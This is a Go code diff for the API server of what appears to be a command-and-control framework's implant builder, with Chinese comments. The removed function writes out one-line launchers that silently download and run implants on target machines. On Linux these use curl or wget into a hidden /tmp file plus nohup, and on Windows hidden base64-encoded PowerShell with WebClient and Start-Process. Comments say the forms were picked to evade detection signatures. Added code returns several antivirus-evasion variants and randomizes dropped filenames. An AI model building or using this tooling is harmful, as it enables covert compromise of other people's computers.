@@ -1,12 +1,12 @@
 package api
 
 import (
+	cryptorand "crypto/rand"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"math/rand"
 	"net/http"
-	"net/url"
 	"os"
 	"path/filepath"
 	"sort"
@@ -56,7 +56,7 @@ func (s *Server) listBuildersHandler(w http.ResponseWriter, r *http.Request) {
 		"arch":      archList,
 		"listeners": listeners,
 		"languages": map[string]interface{}{
-			"go":        true, // Go 植入端：全功能
+			"go":        true,   // Go 植入端：全功能
 			"c":         cAvail, // C 植入端：体积极小（~50KB），仅 Windows exe，基础功能
 			"c_message": "C 植入端需服务端安装 mingw-w64 gcc（MSYS2），支持 Windows x86/x64",
 		},
@@ -180,7 +180,17 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		SHA256:      result.SHA256,
 		BuildTime:   result.BuildTime.Format(time.RFC3339),
 		DownloadURL: fmt.Sprintf("/api/v1/implants/stored/%s", buildID),
-		OneLiner:    s.buildOneLiner(&req, buildID),
+	}
+	// 一键上线命令：地址由服务端按目标机可达性解析（见 oneliner.go），
+	// 并一次性给出多套免杀变体，前端只负责展示。
+	if set := s.oneLinerSet(r, req.ServerURL, req.OS, req.Format, buildID, req.DownloadHost); set != nil {
+		response.OneLinerHost = set.Host
+		response.OneLinerBase = set.BaseURL
+		response.OneLinerWarning = set.Warning
+		response.OneLiners = set.Variants
+		if len(set.Variants) > 0 {
+			response.OneLiner = set.Variants[0].Command
+		}
 	}
 
 	implantDir := s.cfg.Implant.OutputDir
@@ -229,9 +239,9 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 			Arch:        req.Arch,
 			Protocol:    req.Protocol,
 			ServerURL:   req.ServerURL,
-		Size:        int64(len(saveData)),
-		SHA256:      result.SHA256,
-		Filename:    filename,
+			Size:        int64(len(saveData)),
+			SHA256:      result.SHA256,
+			Filename:    filename,
 			CreatedAt:   now,
 			OptionsJSON: string(optsJSON),
 		})
@@ -316,68 +326,25 @@ func (s *Server) downloadPayloadHandler(w http.ResponseWriter, r *http.Request) 
 	http.Error(w, `{"error":"未找到已构建的载荷文件，请先重新生成载荷后再下载"}`, http.StatusNotFound)
 }
 
-// buildOneLiner 生成"一条命令上线"命令：在目标机执行该命令即可静默下载并运行
-// 刚生成的载荷（下载端点免认证，URL 含载荷 ID）。
-// 不同监听器对应不同载荷，命令中的下载 URL 指向该监听器的 web 后台。
-// Windows 使用 PowerShell -enc（UTF-16LE Base64）执行，避开 Invoke-WebRequest
-// / -ep bypass 等明文特征；Linux 使用 curl（回退 wget）下载后后台运行。
-func (s *Server) buildOneLiner(req *BuildRequest, buildID string) string {
-	osName := strings.ToLower(req.OS)
-	if osName != "" && osName != "windows" && osName != "linux" {
-		return ""
-	}
-	// 仅可直接运行的载荷支持一条命令上线：
-	// Windows 为 exe/raw；Linux 为 bin/exe/raw（so 是动态库，不能直接执行）。
-	switch osName {
-	case "linux":
-		if req.Format != "exe" && req.Format != "raw" && req.Format != "bin" {
-			return ""
-		}
-	default: // windows 或未指定，按 Windows 处理
-		if req.Format != "exe" && req.Format != "raw" {
-			return ""
-		}
-	}
-
-	host := "localhost"
-	if u, err := url.Parse(req.ServerURL); err == nil && u.Hostname() != "" {
-		host = u.Hostname()
-	}
-
-	scheme := "http"
-	if s.cfg.Server.TLSCert != "" && s.cfg.Server.TLSKey != "" {
-		scheme = "https"
-	}
-	port := s.cfg.Server.APIPort
-	if port == 0 {
-		port = 8081
-	}
-
-	dlURL := fmt.Sprintf("%s://%s:%d/api/v1/implant/payload/%s", scheme, host, port, buildID)
-
-	switch osName {
-	case "linux":
-		tmp := fmt.Sprintf("/tmp/.%s", randName(4))
-		return fmt.Sprintf(
-			`curl -fsSL '%s' -o %s 2>/dev/null || wget -qO %s '%s'; chmod +x %s; nohup %s >/dev/null 2>&1 &`,
-			dlURL, tmp, tmp, dlURL, tmp, tmp)
-	default: // windows（或未指定，按 Windows 处理）
-		tmp := randName(4) + ".exe"
-		ps := fmt.Sprintf(
-			`$p="$env:TEMP\%s";$w=New-Object Net.WebClient;$w.DownloadFile('%s',$p);Start-Process $p -WindowStyle Hidden`,
-			tmp, dlURL)
-		return fmt.Sprintf("powershell -w hidden -nop -enc %s", encodeUTF16LE(ps))
-	}
-}
-
 // randName 生成 n 位小写字母数字随机串，用于随机化载荷落地文件名，降低固定
 // 文件名（如 svc.exe）被静态特征匹配的概率。
+//
+// 使用 crypto/rand：早期用 time.Now().UnixNano() 播种 math/rand，在同一毫秒内
+// 连续调用会拿到相同种子，导致一次生成的多条上线命令落地文件名完全一样
+// （Windows 时钟粒度下实测复现），削弱随机化意义。
 func randName(n int) string {
 	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
-	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	b := make([]byte, n)
+	if _, err := cryptorand.Read(b); err != nil {
+		// crypto/rand 不可用（极罕见）时退回时间播种，保证功能可用。
+		rng := rand.New(rand.NewSource(time.Now().UnixNano() + rand.Int63()))
+		for i := range b {
+			b[i] = letters[rng.Intn(len(letters))]
+		}
+		return string(b)
+	}
 	for i := range b {
-		b[i] = letters[rng.Intn(len(letters))]
+		b[i] = letters[int(b[i])%len(letters)]
 	}
 	return string(b)
 }
